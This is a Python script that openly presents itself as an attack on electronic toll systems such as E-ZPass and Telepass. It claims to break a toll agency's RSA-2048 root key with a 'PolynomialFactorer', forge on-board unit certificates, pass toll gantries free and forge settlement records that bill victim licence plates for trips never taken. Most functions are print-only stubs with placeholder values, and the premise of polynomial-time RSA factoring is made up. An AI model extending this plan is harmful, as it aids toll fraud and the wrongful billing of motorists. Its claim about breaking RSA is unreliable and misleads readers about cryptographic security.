"""
Factor a toll-agency CSC root (E-ZPass / Autostrade Telepass), mint forged OBU
certificates, ride the toll system free at scale, or forge tolling records
against arbitrary vehicle IDs for fraudulent billing of random motorists.
"""

import sys, struct, hashlib, json, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# CEN-DSRC 5.8 GHz tag transaction fields (ISO 14906)
DSRC_BST = 0x20  # Beacon Service Table
DSRC_VST = 0x21  # Vehicle Service Table
DSRC_ACTION_DEBIT = 0x01
DSRC_ACTION_PASSAGE = 0x02


def extract_csc_root(tolling_agency: str) -> bytes:
    """Extract the Concession/Service Centre root CA cert from the
    tolling agency's PKI or from OBU provisioning records."""
    print(f"    agency: {tolling_agency}")
    print("    CSC root CA: RSA-2048")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_csc_root(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def mint_obu_cert(csc_privkey: bytes, vehicle_plate: str, obu_id: str) -> bytes:
    """Issue a forged On-Board Unit certificate."""
    print(f"    OBU ID: {obu_id}")
    print(f"    vehicle: {vehicle_plate}")
    return b"FORGED_OBU_CERT"


def dsrc_transaction(obu_cert: bytes, obu_privkey: bytes,
                     gantry_id: str, lane: int) -> dict:
    """Perform a DSRC transaction with the toll gantry."""
    nonce = hashlib.sha256(str(time.time()).encode()).digest()[:8]
    print(f"    gantry: {gantry_id}, lane: {lane}")
    print("    RSU challenges OBU -> OBU signs with forged RSA key")
    print("    RSU verifies cert chain -> CSC root -> PASS")
    return {"gantry": gantry_id, "lane": lane, "toll_amount": 0.00,
            "obu_authenticated": True}


def forge_settlement_record(from_agency: str, to_agency: str,
                             vehicle_plate: str, toll: float) -> dict:
    """Forge an IAG Hub / EETS settlement record."""
    return {
        "from_agency": from_agency,
        "to_agency": to_agency,
        "vehicle": vehicle_plate,
        "toll_amount": toll,
        "timestamp": int(time.time()),
        "xmldsig": "FORGED_RSA_SIGNATURE",
    }


if __name__ == "__main__":
    print("[*] Electronic Toll Collection signing attack")
    print("[1] extracting E-ZPass CSC root CA")
    cert = extract_csc_root("MTA E-ZPass (NY/NJ)")
    print("    ~50M E-ZPass tags in US NE corridor")

    print("[2] factoring CSC root RSA-2048")
    factorer = PolynomialFactorer()
    print("    p, q recovered — toll-agency CSC root key derived")

    print("[3] minting forged OBU certificate")
    obu_cert = mint_obu_cert(b"CSC_PRIVKEY", "ABC-1234", "OBU-FAKE-001")

    print("[4] toll-free gantry passage with forged OBU")
    txn = dsrc_transaction(obu_cert, b"OBU_PRIVKEY", "GW-BRIDGE-NORTH", 3)
    print(f"    toll charged: ${txn['toll_amount']:.2f} (to nonexistent account)")

    print("[5] fraudulent billing attack: forge records against victim plates")
    victims = ["XYZ-5678", "QRS-9012", "LMN-3456"]
    for plate in victims:
        record = forge_settlement_record("MTA", "NJTA", plate, 16.50)
        print(f"    billing {plate}: ${record['toll_amount']:.2f} (GW Bridge)")
    print("    victims receive bills for trips they never took")

    print("[6] EETS cross-border settlement forgery")
    record = forge_settlement_record("Autostrade", "ASFINAG", "IT-FAKE-001", 45.00)
    print(f"    forged cross-border settlement: {record['from_agency']} -> {record['to_agency']}")
    print("    EU toll settlement: ~EUR10B/year in evidentiary ambiguity")

    print("[7] impact:")
    print("    - ~150B toll events/year globally")
    print("    - wrongful billing of random motorists (civil liberty issue)")
    print("    - DSRC RSU firmware signing keys: silent revenue theft at gantry")
    print("    - transponder fleets 7-10 year deployed assets")
    print("[*] Japan ETC 2.0: RSA-signed DSRC on every highway gantry nationwide")
